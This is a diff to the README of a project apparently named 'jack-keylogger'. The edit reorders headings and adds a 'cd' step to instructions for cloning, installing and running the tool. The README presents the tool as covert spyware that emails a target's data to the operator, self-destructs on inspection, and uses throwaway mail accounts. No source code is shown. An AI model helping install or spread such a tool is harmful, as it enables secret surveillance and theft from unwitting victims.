@@ -1,7 +1,7 @@
 # jack-keylogger
 Sends target's hardware data to your email client every 10 seconds (can be changed) and destroys itself if target tries to find the SMTP username and password.
 
-## INSTALLATION
+## PREREQUISITES
 
 This program supports:
 - Windows
@@ -15,15 +15,22 @@ Note: **You need to add your SMTP USERNAME and SMTP PASSWORD of the email client
 
 (you can create an email client from "https://mailtrap.io/" using a temp mail.)
 
+## INSTALLATION 
+
 ```
 git clone https://github.com/krishealty/jack-keylogger.git
 ```
 
 ```
+cd jack-keylogger
+```
+
+
+```
 pip install -r requirements.txt
 ```
 
-**Run the script.**
+## USAGE
 
 ```
 python3 keylogger.py
